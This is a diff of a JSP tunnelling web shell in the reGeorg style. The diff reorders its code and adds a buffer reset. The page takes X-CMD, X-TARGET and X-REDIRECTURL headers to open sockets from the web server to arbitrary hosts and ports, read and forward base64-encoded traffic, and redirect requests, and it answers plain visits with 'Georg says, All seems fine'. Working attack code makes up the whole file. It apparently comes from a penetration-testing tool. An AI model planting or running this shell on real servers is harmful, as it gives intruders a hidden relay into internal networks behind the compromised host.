@@ -1,93 +1,4 @@
-<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.io.*, java.net.*"%>
-<%
-    String rUrl = request.getHeader("X-REDIRECTURL");
-    if (rUrl != null) {
-        rUrl = new String(b64de(rUrl));
-        redirectRequest("X-REDIRECTURL", rUrl, request, response);
-        if ( true ) return; // exit
-    }
-
-    response.setStatus(HTTPCODE);
-    String cmd = request.getHeader("X-CMD");
-    if (cmd != null) {
-        String mark = cmd.substring(0,22);
-        cmd = cmd.substring(22);
-        response.setHeader("X-STATUS", "OK");
-        if (cmd.compareTo("CONNECT") == 0) {
-            try {
-                String[] target_ary = new String(b64de(request.getHeader("X-TARGET"))).split("\\|");
-                String target = target_ary[0];
-                int port = Integer.parseInt(target_ary[1]);
-                SocketChannel socketChannel = SocketChannel.open();
-                socketChannel.connect(new InetSocketAddress(target, port));
-                socketChannel.configureBlocking(false);
-                session.setAttribute(mark, socketChannel);
-                response.setHeader("X-STATUS", "OK");
-            } catch (Exception e) {
-                response.setHeader("X-ERROR", "Failed connecting to target");
-                response.setHeader("X-STATUS", "FAIL");
-            }
-            puts(response, "");
-        } else if (cmd.compareTo("DISCONNECT") == 0) {
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
-            try{
-                socketChannel.socket().close();
-            } catch (Exception e) {
-            }
-            session.removeAttribute(mark);
-            puts(response, "");
-        } else if (cmd.compareTo("READ") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
-            try{
-                ByteBuffer buf = ByteBuffer.allocate(513);
-                int bytesRead = socketChannel.read(buf);
-                ServletOutputStream so = response.getOutputStream();
-                while (bytesRead > 0){
-                    byte[] data = new byte[bytesRead];
-                    System.arraycopy(buf.array(), 0, data, 0, bytesRead);
-                    byte[] base64 = b64en(data).getBytes();
-                    so.write(base64, 0, base64.length);
-                    buf.clear();
-                    bytesRead = socketChannel.read(buf);
-                }
-                so.close();
-                response.setHeader("X-STATUS", "OK");
-
-            } catch (Exception e) {
-                response.setHeader("X-STATUS", "FAIL");
-                puts(response, "");
-            }
-
-        } else if (cmd.compareTo("FORWARD") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
-            try {
-
-                int readlen = request.getContentLength();
-                byte[] buff = new byte[readlen];
-
-                request.getInputStream().read(buff, 0, readlen);
-                byte[] base64 = b64de(new String(buff));
-                ByteBuffer buf = ByteBuffer.allocate(base64.length);
-                buf.clear();
-                buf.put(base64);
-                buf.flip();
-
-                while(buf.hasRemaining())
-                    socketChannel.write(buf);
-
-                response.setHeader("X-STATUS", "OK");
-
-            } catch (Exception e) {
-                response.setHeader("X-ERROR", "POST request read filed");
-                response.setHeader("X-STATUS", "FAIL");
-                socketChannel.socket().close();
-            }
-            puts(response, "");
-        }
-    } else {
-        puts(response, "Georg says, 'All seems fine'");
-    }
-%>
+<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*"%>
 <%!
     private static char[] en = "BASE64 CHARSLIST".toCharArray();
     public static String b64en(byte[] data) {
@@ -249,5 +160,95 @@
            out += "-";
         }
         return out.substring(0, out.length() - 1);
+    }
+%>
+<%
+    String rUrl = request.getHeader("X-REDIRECTURL");
+    if (rUrl != null) {
+        rUrl = new String(b64de(rUrl));
+        redirectRequest("X-REDIRECTURL", rUrl, request, response);
+        if ( true ) return; // exit
+    }
+
+    response.resetBuffer();
+    response.setStatus(HTTPCODE);
+    String cmd = request.getHeader("X-CMD");
+    if (cmd != null) {
+        String mark = cmd.substring(0,22);
+        cmd = cmd.substring(22);
+        response.setHeader("X-STATUS", "OK");
+        if (cmd.compareTo("CONNECT") == 0) {
+            try {
+                String[] target_ary = new String(b64de(request.getHeader("X-TARGET"))).split("\\|");
+                String target = target_ary[0];
+                int port = Integer.parseInt(target_ary[1]);
+                SocketChannel socketChannel = SocketChannel.open();
+                socketChannel.connect(new InetSocketAddress(target, port));
+                socketChannel.configureBlocking(false);
+                session.setAttribute(mark, socketChannel);
+                response.setHeader("X-STATUS", "OK");
+            } catch (Exception e) {
+                response.setHeader("X-ERROR", "Failed connecting to target");
+                response.setHeader("X-STATUS", "FAIL");
+            }
+            puts(response, "");
+        } else if (cmd.compareTo("DISCONNECT") == 0) {
+            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            try{
+                socketChannel.socket().close();
+            } catch (Exception e) {
+            }
+            session.removeAttribute(mark);
+            puts(response, "");
+        } else if (cmd.compareTo("READ") == 0){
+            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            try{
+                ByteBuffer buf = ByteBuffer.allocate(513);
+                int bytesRead = socketChannel.read(buf);
+                ServletOutputStream so = response.getOutputStream();
+                while (bytesRead > 0){
+                    byte[] data = new byte[bytesRead];
+                    System.arraycopy(buf.array(), 0, data, 0, bytesRead);
+                    byte[] base64 = b64en(data).getBytes();
+                    so.write(base64, 0, base64.length);
+                    buf.clear();
+                    bytesRead = socketChannel.read(buf);
+                }
+                so.close();
+                response.setHeader("X-STATUS", "OK");
+
+            } catch (Exception e) {
+                response.setHeader("X-STATUS", "FAIL");
+                puts(response, "");
+            }
+
+        } else if (cmd.compareTo("FORWARD") == 0){
+            SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
+            try {
+
+                int readlen = request.getContentLength();
+                byte[] buff = new byte[readlen];
+
+                request.getInputStream().read(buff, 0, readlen);
+                byte[] base64 = b64de(new String(buff));
+                ByteBuffer buf = ByteBuffer.allocate(base64.length);
+                buf.clear();
+                buf.put(base64);
+                buf.flip();
+
+                while(buf.hasRemaining())
+                    socketChannel.write(buf);
+
+                response.setHeader("X-STATUS", "OK");
+
+            } catch (Exception e) {
+                response.setHeader("X-ERROR", "POST request read filed");
+                response.setHeader("X-STATUS", "FAIL");
+                socketChannel.socket().close();
+            }
+            puts(response, "");
+        }
+    } else {
+        puts(response, "Georg says, 'All seems fine'");
     }
 %>
